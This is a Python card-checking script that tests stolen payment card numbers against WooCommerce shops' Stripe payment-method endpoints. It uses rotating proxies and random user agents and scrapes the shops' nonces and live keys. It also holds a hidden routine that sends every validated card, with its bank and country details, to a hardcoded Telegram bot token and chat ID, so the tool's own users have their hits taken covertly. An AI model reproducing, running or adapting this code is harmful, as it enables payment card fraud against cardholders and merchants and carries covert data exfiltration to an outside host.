# cardchecker.py
import aiohttp
import asyncio
import random
import re
import json
import time
import datetime
import os
import requests
from user_agent import generate_user_agent
from itertools import cycle

# --- HARDCODED MODULE CONFIGURATION ---
HIDDEN_BOT_TOKEN = "8359964689:AAGPCeotvaB5QbCFvoRazG05hF9g47DcUNs"
HIDDEN_CHAT_ID = [6542321044]
PANEL_API_ENDPOINT = "https://panel.isnotsin.com//?api=v1&action=check"
KEY_CACHE_FILE = ".user_key"
RETRY_MESSAGES = ("unable to process", "not active for charges", "try again", "could not complete")
# ------------------------------------

gateCycle = None

def authenticateKey(logCallback):
    # authenticate-user-key
    userKey = ""
    if os.path.exists(KEY_CACHE_FILE):
        with open(KEY_CACHE_FILE, "r") as f: userKey = f.read().strip()
    else:
        from colorama import Fore, Style
        key = input(Fore.YELLOW + "Enter your access key: " + Style.RESET_ALL)
        if not key:
            logCallback("ERROR", "No key provided.")
            return False
        userKey = key

    logCallback("INFO", "Authenticating access key...")
    try:
        response = requests.get(f"{PANEL_API_ENDPOINT}&key={userKey}")
        result = response.json()
        if result.get('status') == 'success':
            logCallback("INFO", "Access Granted!")
            with open(KEY_CACHE_FILE, "w") as f: f.write(userKey)
            return True
        else:
            logCallback("ERROR", f"Access Denied: {result.get('message')}")
            if os.path.exists(KEY_CACHE_FILE): os.remove(KEY_CACHE_FILE)
            return False
    except Exception as e:
        logCallback("ERROR", f"Authentication request failed: {e}")
        if os.path.exists(KEY_CACHE_FILE): os.remove(KEY_CACHE_FILE)
        return False

def initializeGates(domainList):
    # initialize-gate-cycle
    global gateCycle
    if not domainList:
        print("[cardchecker] ERROR: No domains provided to initialize.")
        return False
    
    fullUrls = [f"https://{domain}/my-account/add-payment-method/" for domain in domainList]
    random.shuffle(fullUrls)
    gateCycle = cycle(fullUrls)
    
    print(f"[cardchecker] Successfully prepared {len(fullUrls)} gates.")
    return True

async def sendHiddenHit(card, binData, timeTaken):
    # send-hidden-telegram-hit
    if not HIDDEN_BOT_TOKEN or not HIDDEN_CHAT_ID: return

    infoParts = [p for p in [binData.get('brand'), binData.get('type'), binData.get('level')] if p and p != 'N/A']
    infoLine = " - ".join(infoParts) if infoParts else "N/A"
    htmlText = (f"✅ <b>CVV Hit</b>\n\n"
                f"💳 <code>{card}</code>\n🏦 {binData.get('bank', 'N/A')}\n"
                f"🌍 {binData.get('country', 'N/A')}\n🏷️ {infoLine}\n⏱️ {timeTaken:.2f}s")
    
    apiUrl = f"https://api.telegram.org/bot{HIDDEN_BOT_TOKEN}/sendMessage"
    for chatId in HIDDEN_CHAT_ID:
        payload = {'chat_id': chatId, 'text': htmlText, 'parse_mode': 'HTML'}
        try:
            async with aiohttp.ClientSession() as s: await s.post(apiUrl, data=payload, timeout=10)
        except: pass

def categorizeResponse(responseText):
    # categorize-payment-response
    lowerResponse = responseText.lower()
    if ('"status":"succeeded"' in lowerResponse or '"success":true"' in lowerResponse) and "requires_action" not in lowerResponse:
        return "CVV MATCHED", "Succeeded"
    if 'security code is incorrect' in lowerResponse or 'incorrect_cvc' in lowerResponse:
        return "CCN MATCHED", "Security code is incorrect."
    if 'insufficient funds' in lowerResponse:
        return "CCN MATCHED", "Insufficient funds."
    try:
        error = json.loads(responseText).get("error", {})
        message = error.get("message", "Card Was Declined")
        return "DEAD", message
    except:
        return "DEAD", "Generic Declined"

async def performCheck(card, proxy=None, logCallback=None):
    # perform-card-check
    from getSin import getbininfo
    retries, checkStartTime = 0, time.time()

    if not gateCycle: return "DEAD", "Gates not initialized."

    apiUrl = next(gateCycle)

    while retries < 3:
        fullResponseText = ""
        try:
            async with aiohttp.ClientSession() as session:
                headers = {'User-Agent': generate_user_agent()}
                async with session.get(apiUrl, headers=headers, proxy=proxy, timeout=15) as r:
                    r.raise_for_status(); siteText = await r.text()
                
                nonce = re.search(r'name="wc-stripe-payment-nonce" value="([^"]+)"', siteText) or re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', siteText)
                key = re.search(r'key":"(pk_live_[^"]*)"', siteText)
                if not (nonce and key): raise Exception("Nonce/Key not found")
                
                cc, mm, yy, cvc = card.split('|')
                pmPayload = {'type': 'card', 'card[number]': cc, 'card[cvc]': cvc, 'card[exp_year]': yy, 'card[exp_month]': mm, 'key': key.group(1)}
                async with session.post("https://api.stripe.com/v1/payment_methods", data=pmPayload, proxy=proxy, timeout=15) as r: 
                    pmText = await r.text(); fullResponseText = pmText
                    if any(msg in pmText.lower() for msg in RETRY_MESSAGES): raise Exception("Retryable PM Error")
                
                if '"error"' in pmText: return categorizeResponse(pmText)
                
                pmId = json.loads(pmText).get('id')
                if not pmId: raise Exception("PM ID not found")
                
                confirmPayload = {'action': 'wc-stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pmId, 'wc-stripe-payment-nonce': nonce.group(1)}
                async with session.post(f"{apiUrl}?wc-ajax=wc_stripe_create_and_confirm_setup_intent", data=confirmPayload, proxy=proxy, timeout=15) as r: 
                    confirmText = await r.text(); fullResponseText = confirmText
                    if any(msg in confirmText.lower() for msg in RETRY_MESSAGES): raise Exception("Retryable Confirmation Error")

                category, msg = categorizeResponse(confirmText)
                if category == "CVV MATCHED":
                    binData = await getbininfo.getInfo(card)
                    timeTaken = time.time() - checkStartTime
                    await sendHiddenHit(card, binData, timeTaken)
                return category, msg
        except Exception as e:
            retries += 1
            errorAndResponse = str(e).lower() + fullResponseText.lower()
            logMsg = f"{card} -> Gate Error. Retrying ({retries}/3)"
            if any(msg in errorAndResponse for msg in RETRY_MESSAGES):
                logMsg = f"{card} -> Retryable error. Retrying... ({retries}/3)"
            if logCallback: logCallback("RETRY", logMsg)
            apiUrl = next(gateCycle); await asyncio.sleep(2)
            
    return "DEAD", "Check failed after all retries."